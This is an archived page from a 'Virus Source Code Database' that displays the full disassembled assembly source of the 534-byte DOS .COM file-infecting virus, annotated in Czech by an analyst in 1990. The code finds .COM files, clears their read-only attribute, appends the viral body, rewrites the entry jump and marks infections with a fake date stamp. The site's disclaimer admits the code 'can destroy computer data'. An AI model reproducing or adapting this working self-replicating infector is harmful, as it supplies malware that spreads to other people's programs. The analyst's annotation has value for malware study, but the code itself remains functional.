<html>
<head><meta http-equiv=Content-Type content='text/html; charset=UTF-8'>

<title>Virus Source Code Database :: 534_asm</title>
<meta name="KEYWORDS" content="534.asm, virus source, source code, assembly language, assembly programming, hacking, cracking, michaelangelo, stoned, pong, cascade, ambulance, f-prot, mcafee, panda, solomon, anti-virus, anti virus, computer virus">
<meta name="DESCRIPTION" content="Virus Source Code Database - source for 534.asm">
</head><body><table border=0 cellpadding=0 cellspacing=0 width="100%">
<tr><td valign=top width="25%">
<a href="1000year_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/1000year_asm.php">1000year_asm</a><br><a href="102_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/102_asm.php">102_asm</a><br><a href="1260__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/1260__asm.php">1260__asm</a><br><a href="1260_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/1260_asm.php">1260_asm</a><br><a href="133_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/133_asm.php">133_asm</a><br><a href="134_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/134_asm.php">134_asm</a><br><a href="1575_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/1575_asm.php">1575_asm</a><br><a href="1575_e_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/1575_e_asm.php">1575_e_asm</a><br><a href="1575-org_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/1575-org_asm.php">1575-org_asm</a><br><a href="1701_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/1701_asm.php">1701_asm</a><br><a href="1704__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/1704__asm.php">1704__asm</a><br><a href="1704_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/1704_asm.php">1704_asm</a><br><a href="1808_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/1808_asm.php">1808_asm</a><br><a href="1888_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/1888_asm.php">1888_asm</a><br><a href="1963_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/1963_asm.php">1963_asm</a><br><a href="196_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/196_asm.php">196_asm</a><br><a href="1992_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/1992_asm.php">1992_asm</a><br><a href="1ststar_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/1ststar_asm.php">1ststar_asm</a><br><a href="1stvirus_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/1stvirus_asm.php">1stvirus_asm</a><br><a href="203_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/203_asm.php">203_asm</a><br><a href="2249_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/2249_asm.php">2249_asm</a><br><a href="2350_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/2350_asm.php">2350_asm</a><br><a href="2400_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/2400_asm.php">2400_asm</a><br><a href="2471_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/2471_asm.php">2471_asm</a><br><a href="2501_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/2501_asm.php">2501_asm</a><br><a href="2564_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/2564_asm.php">2564_asm</a><br><a href="2626_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/2626_asm.php">2626_asm</a><br><a href="2715_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/2715_asm.php">2715_asm</a><br><a href="29bytes_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/29bytes_asm.php">29bytes_asm</a><br><a href="3066_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/3066_asm.php">3066_asm</a><br><a href="30_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/30_asm.php">30_asm</a><br><a href="334_b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/334_b_asm.php">334_b_asm</a><br><a href="334-b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/334-b_asm.php">334-b_asm</a><br><a href="382_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/382_asm.php">382_asm</a><br><a href="405_a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/405_a_asm.php">405_a_asm</a><br><a href="405__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/405__asm.php">405__asm</a><br><a href="405_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/405_asm.php">405_asm</a><br><a href="405_b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/405_b_asm.php">405_b_asm</a><br><a href="4096a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/4096a_asm.php">4096a_asm</a><br><a href="4096____asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/4096____asm.php">4096____asm</a><br><a href="4096___asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/4096___asm.php">4096___asm</a><br><a href="4096__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/4096__asm.php">4096__asm</a><br><a href="4096_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/4096_asm.php">4096_asm</a><br><a href="42bites_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/42bites_asm.php">42bites_asm</a><br><a href="44__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/44__asm.php">44__asm</a><br><a href="44_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/44_asm.php">44_asm</a><br><a href="45_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/45_asm.php">45_asm</a><br><a href="500_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/500_asm.php">500_asm</a><br><a href="5120_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/5120_asm.php">5120_asm</a><br><a href="512__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/512__asm.php">512__asm</a><br><a href="512_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/512_asm.php">512_asm</a><br><a href="512_e_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/512_e_asm.php">512_e_asm</a><br><a href="512-e_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/512-e_asm.php">512-e_asm</a><br><a href="512_f_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/512_f_asm.php">512_f_asm</a><br><a href="512-f_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/512-f_asm.php">512-f_asm</a><br><a href="534_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/534_asm.php">534_asm</a><br><a href="541__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/541__asm.php">541__asm</a><br><a href="541_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/541_asm.php">541_asm</a><br><a href="560_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/560_asm.php">560_asm</a><br><a href="578_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/578_asm.php">578_asm</a><br><a href="583_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/583_asm.php">583_asm</a><br><a href="583virus_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/583virus_asm.php">583virus_asm</a><br><a href="648_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/648_asm.php">648_asm</a><br><a href="7son_284_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/7son_284_asm.php">7son_284_asm</a><br><a href="7son_332_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/7son_332_asm.php">7son_332_asm</a><br><a href="7son426b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/7son426b_asm.php">7son426b_asm</a><br><a href="7son-473_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/7son-473_asm.php">7son-473_asm</a><br><a href="7son473b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/7son473b_asm.php">7son473b_asm</a><br><a href="7th_son4_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/7th_son4_asm.php">7th_son4_asm</a><br><a href="7th_son__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/7th_son__asm.php">7th_son__asm</a><br><a href="808__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/808__asm.php">808__asm</a><br><a href="808_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/808_asm.php">808_asm</a><br><a href="80hex_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/80hex_asm.php">80hex_asm</a><br><a href="90210_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/90210_asm.php">90210_asm</a><br></td>
<td valign=top><center><h2>Virus Source Code Database</h2>
<script type="text/javascript">
<!--
                  google_ad_client = "pub-4280558320877613";
                  google_ad_width = 468;
                  google_ad_height = 60;
                  google_ad_format = "468x60_as";
                  google_ad_channel = "5524853059";
                  google_ad_type = "text";
                  google_color_border = "A2CCEE";
                  google_color_bg = "EFEFEF";
                  google_color_link = "000000";
                  google_color_url = "006600";
                  google_color_text = "000000";
        //--></script>
<script type="text/javascript" src="show_ads.js" tppabs="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>
<p>
<i>This source code is provided for computer programming history.  This source code can be used for good or evil.  It can 
destroy computer data.  Be aware that I am making no claims to authorship or usability of the information found in the 
Virus Source Code Database.  I accept no responsibility for data corruption due to the use of the following information.  The 
information contained on this website is for <b>Information Purposes Only</b>!!!</i><p>
<p>
[ <a href="index.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/index.php">1</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/a/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/a/index.php'" tppabs="http://www.totallygeek.com/vscdb/a/index.php">a</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/b/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/b/index.php'" tppabs="http://www.totallygeek.com/vscdb/b/index.php">b</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/c/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/c/index.php'" tppabs="http://www.totallygeek.com/vscdb/c/index.php">c</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/d/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/d/index.php'" tppabs="http://www.totallygeek.com/vscdb/d/index.php">d</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/e/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/e/index.php'" tppabs="http://www.totallygeek.com/vscdb/e/index.php">e</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/f/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/f/index.php'" tppabs="http://www.totallygeek.com/vscdb/f/index.php">f</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/g/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/g/index.php'" tppabs="http://www.totallygeek.com/vscdb/g/index.php">g</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/h/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/h/index.php'" tppabs="http://www.totallygeek.com/vscdb/h/index.php">h</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/i/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/i/index.php'" tppabs="http://www.totallygeek.com/vscdb/i/index.php">i</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/j/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/j/index.php'" tppabs="http://www.totallygeek.com/vscdb/j/index.php">j</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/k/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/k/index.php'" tppabs="http://www.totallygeek.com/vscdb/k/index.php">k</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/l/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/l/index.php'" tppabs="http://www.totallygeek.com/vscdb/l/index.php">l</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/m/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/m/index.php'" tppabs="http://www.totallygeek.com/vscdb/m/index.php">m</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/n/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/n/index.php'" tppabs="http://www.totallygeek.com/vscdb/n/index.php">n</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/o/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/o/index.php'" tppabs="http://www.totallygeek.com/vscdb/o/index.php">o</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/p/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/p/index.php'" tppabs="http://www.totallygeek.com/vscdb/p/index.php">p</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/q/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/q/index.php'" tppabs="http://www.totallygeek.com/vscdb/q/index.php">q</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/r/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/r/index.php'" tppabs="http://www.totallygeek.com/vscdb/r/index.php">r</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/s/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/s/index.php'" tppabs="http://www.totallygeek.com/vscdb/s/index.php">s</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/t/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/t/index.php'" tppabs="http://www.totallygeek.com/vscdb/t/index.php">t</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/u/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/u/index.php'" tppabs="http://www.totallygeek.com/vscdb/u/index.php">u</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/v/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/v/index.php'" tppabs="http://www.totallygeek.com/vscdb/v/index.php">v</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/w/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/w/index.php'" tppabs="http://www.totallygeek.com/vscdb/w/index.php">w</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/x/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/x/index.php'" tppabs="http://www.totallygeek.com/vscdb/x/index.php">x</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/y/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/y/index.php'" tppabs="http://www.totallygeek.com/vscdb/y/index.php">y</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/z/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/z/index.php'" tppabs="http://www.totallygeek.com/vscdb/z/index.php">z</a> ]&nbsp;
</center><p><textarea cols=90 rows=30>

seg_a		segment
		assume	cs:seg_a, ds:seg_a
		org	100h
  
izol534		proc	far
  
start:
                jmp     loc_1
                db      500 dup (0)             ; NENI VIRUS !!!
                db      0B8h, 0, 0, 0CDh, 20h   ; ZBYTEK MEHO PROGRAMKU
loc_1:
                push    ax
; --------------   PRENOS USCHOVANYCH TRI BYTU Z VIRU NA ZACATEK PROGRAMU
                mov     si,461h                 ; SI=Zacatek tabulky
                mov     dx,si
		add	si,0
                cld
                mov     cx,3                    ; Kopiruj 3 byty
		mov	di,100h
                rep     movsb
;---------------   TEST VERZE DOSu
                mov     di,dx                   ; DI=Ukazatel na zacatek prac.oblasti
                mov     ah,30h
                int     21h                     ; Get DOS version
		cmp	al,0
                jne     loc_2
                jmp     loc_16                  ; Pokud blba, konec
;---------------   NASTAVENI DTA PRO VIRUS
loc_2:
		mov	dx,2Ch
		add	dx,di
		mov	bx,dx
		mov	ah,1Ah
                int     21h                     ; Set DTA DOS Service
		mov	bp,0
		mov	dx,di
                add     dx,7                    ; DS:DX=ASCIIZ String pro hledani. ????????.COM
;---------------   HLEDANI SOUBORU PRO NAKAZENI
loc_3:
                mov     cx,3                    ; Hledej i Hidden a ReadOnly
                mov     ah,4Eh
                int     21h                     ; DOS Service Find First
                                                ; Hledane jmeno je @ds:dx
                jmp     loc_5
loc_4:
                mov     ah,4Fh
                int     21h                     ; DOS Service Find Next
loc_5:
                jnc     loc_8                   ; Pokud OK, dal
                cmp     al,12h                  ; Chyba NO MORE FILES ??
                je      loc_6                   ; Pokud ano, dalsi testy
                jmp     loc_15                  ; Konci praci a startuj program
loc_6:
                cmp     bp,0FFFFh               ; Hledame '\' ??
                jne     loc_7                   ; Pokud ne, budeme tak cinit
                jmp     loc_15                  ; Jinak KONEC a start programu
loc_7:
                dec     dx                      ; DS:DX ukazuje na '\'
                mov     bp,0FFFFh               ; Signal, ze hledame '\'
                jmp     short loc_3             ; Hledej znovu
loc_8:
                mov     cx,[bx+18h]             ; Cti DATE STAMP
		and	cx,1E0h
                cmp     cx,1A0h                 ; Ma soubor nastaven mesic cislo 13 ?
                je      loc_4                   ; Pokud ano, hledej dal
		cmp	word ptr [bx+1Ah],0FA00h
                ja      loc_4
		cmp	word ptr [bx+1Ah],100h
                jb      loc_4                   ; Pokud je delka>FA00H nebo delka<100H, pak hledej dal
;---------------   PREPIS JMENA SOUBORU DO VIRU
                push    di
		mov	si,bx
		add	si,1Eh
		add	di,14h
                cmp     bp,0FFFFh               ; Hledal se '\'
                jne     loc_9                   ; Pokud ne, jdi dal jinak
                mov     al,5Ch                  ; uloz napred '\'
                stosb                           ; na es:[di]
loc_9:
                lodsb                           ; String [si] do al
                stosb                           ; Uloz al na es:[di]
                cmp     al,0                    ; Konec jmena ?
                jne     loc_9                   ; Dokud ne, tak se cykli
;---------------   ZRUS PRIPADNY READ-ONLY ATTRIBUT
                pop     di                      ; Zacatek workarea zpet
		mov	dx,di
                add     dx,14h                  ; DX ukazuje na zkopirovane jmeno
		mov	ax,4300h
                int     21h                     ; DOS Service GET/SET File Attribut Jmeno @ds:dx
                                                ; V tomto pripade GET Attrib.
                mov     [di+22h],cx             ; Uloz Attrib.
                and     cx,0FFFEh               ; Zamaskuj ReadOnly
                mov     dx,di
                add     dx,14h                  ; DX ukazuje opet na jmeno
		mov	ax,4301h
                int     21h                     ; DOS Service GET/SET File Attr. Jmeno @ds:dx
                                                ; V tomto pripade SET
;---------------    OTEVRENI SOUBORU
                mov     dx,di
                add     dx,14h                  ; DX opet ukazuje na jmeno
		mov	ax,3D02h
                int     21h                     ; DOS Service OPEN FILE
                                                ; Jmeno @ds:dx, pro cteni a zapis
                jnc     loc_10
                jmp     loc_14                  ; Pokud chyba, tak konec
;---------------   FILE DATE
loc_10:
                mov     bx,ax                   ; BX=File Handle
		mov	ax,5700h
                int     21h                     ; DOS Service GET/SET File Date&Time
                                                ; Momentalne GET
                mov     [di+24h],cx             ; Uloz TIME
                mov     [di+26h],dx             ; Uloz DATE
;---------------   NACTE DO SEBE PRVNI 3 BYTY (ZACATEK PROGRAMU)
                mov     ah,3Fh                  
		mov	cx,3
		mov	dx,di
		add	dx,0
                int     21h                     ; DOS Service Read File
                jnc     loc_11
                jmp     loc_13                  ; Pokud chyba, koncit
;---------------   POSUN FILE-POINTERU NA KONEC SOUBORU
loc_11:
                cmp     ax,3                    ; Nacetl OK ?
                jne     loc_13                  ; Pokud ne, koncit
                mov     ax,4202h                ; Budeme delat sluzbu 42H a merit budeme od konce
                mov     cx,0                    ; 0 bytu od konce
		mov	dx,cx
                int     21h                     ; DOS Service MOVE File Ptr cx,dx=offset
;---------------   VYPOCTY PRO ULOZENI
                sub     ax,3                    ; Odecti 3 kvuli JMP instrukci
                mov     [di+4],ax               ; Uloz si to a vytvor tak JMP xxxx instrukci ve workarea
                mov     cx,165h                 ;
                cmp     dx,0                    ; Soubor kratsi nez 65535 B ?
                jne     loc_13                  ; Pokud ne, konec
		mov	dx,di
                sub     di,cx                   ; DI=Zacatek viru (Adresa zacatku)
                add     di,2                    ; Pocatecni instrukce tela viru (MOV SI,zacatek workarea)
		add	ax,103h
                add     ax,cx                   ; AX=Novy zacatek workarea pro kopii
                mov     [di],ax                 ; Uloz to do sebe
;---------------   VLASTNI PRIPOJENI K SOUBORU
                mov     ah,40h
		mov	di,dx
                sub     dx,cx                   ; Zacatek viru v pameti
                mov     cx,216h                 ; Delka viru
                int     21h                     ; DOS Service WRITE File
                                                ; Zapise cx=bytu z ds:dx
                jnc     loc_12
                jmp     loc_13                  ; Pokud nebylo vse OK, konci
;---------------   ZAPIS PRVNICH TRI BYTU (START VIRU)
loc_12:
		cmp	ax,216h
                jne     loc_13                  ; Pokud se nezapsalo celych 216H bytu, konci
                mov     ax,4200h                ; DOS MOVE od zacatku souboru
                mov     cx,0                    ; 0 bytu offset
		mov	dx,cx
                int     21h                     ; DOS Service MOVE File Ptr
                                                ; cx,dx=offset (Zde nastavi na zacatek)
                jc      loc_13                  ; Pokud chyba, konec
                mov     ah,40h
                mov     cx,3                    ; Tri byty
                mov     dx,di                   ; ds:dx ukazuje na upraveny JMP do viru
		add	dx,3
                int     21h                     ; DOS Service WRITE File
                                                ; cx=bytu z ds:dx
;---------------    UPRAVA DATA SOUBORU JAKO TEST PRO SIRENI (13.MESIC)
loc_13:
                mov     cx,[di+24h]             ; CX=DATE STAMP
                mov     dx,[di+26h]             ; DX=TIME STAMP
		and	dx,0FE1Fh
                or      dx,1A0h                 ; Vyrobil 13 mesic
		mov	ax,5701h
                int     21h                     ; DOS Service GET/SET File Date&Time
                                                ; V tomto pripade SET
                mov     ah,3Eh
                int     21h                     ; DOS Service CLOSE File
;---------------   UPRAV ATTRIBUTY SOUBORU NA PUVODNI HODNOTU

;---------------   !!!!!! ZDE JE VE VIRU CHYBA !!!!!!   --------------------
loc_14:
                mov     ax,4300h                ; ZDE JE ZREJME CHYBA !! MELO BY BYT  MOV AX,4301H
                mov     cx,[di+22h]             ; Puvodni attrib. do CX
                int     21h                     ; DOS Service GET/SET Attrib.
                                                ; jmeno @ds:dx, ZDE JE PUVODNE GET, ALE MELO BY TU BYT SET
;---------------    ZPATKY DTA NA PUVODNI HODNOTU
loc_15:
		mov	dx,80h
		mov	ah,1Ah
                int     21h                     ; DOS Service Set DTA na DS:DX
;---------------   START PUVODNIHO PROGRAMU
loc_16:
		pop	ax
                mov     di,100h                 ; Adresa startu
		push	di
                retn                            ; Skoc tam
                db      0E9h, 0F4h, 1, 0E9h, 0F9h, 1    ; Zde se schovavaji a tvori JMP xxxx
                db      5Ch                             ; '\'
                db      8 dup (3Fh)                     ; '????????'
                db      2Eh, 43h, 4Fh, 4Dh, 0           ; '.COM'
                db      'MODEL.COM'                     ; Sem se kopiruje jmeno souboru a directory info
		db	0, 0, 4Dh, 0, 0, 20h
		db	0, 2Bh, 0BDh, 0A3h, 14h, 0
		db	0, 0, 0, 1
		db	3Fh
		db	7 dup (3Fh)
		db	43h, 4Fh, 4Dh, 3, 2
		db	7 dup (0)
		db	20h, 2Bh, 0BDh, 0A3h, 14h, 0FCh
		db	1, 0, 0
		db	'MODEL.COM'
		db	0, 0, 0, 0
		db	'osoftyright Microsoftyright Micr'
		db	'osoftyright Microsoftyright Micr'
		db	'osoftyright Microsoft 1988'
  
izol534		endp
  
seg_a		ends
  
  
  
		end	start






; Virus se tedy jen kopiruje a nic destruktivniho nedela
; Napada jen .COM soubory od velikosti 100H do 0FA00H
; Jako identifikator nakazeni je pouzit 13.mesic v date stamp
; Neni rezidentni v pameti a pri kazdem spusteni infikovaneho programu se
; muze nakazit jen jeden soubor.
; Lze proti nemu napsat vakcinu celkem snadno. Programy lze i imunizovat
;
;
;
;
; Analysed and disassembled by Pavel Korensky PKCS 3.5.1990


</textarea></td></tr></table></body></html>
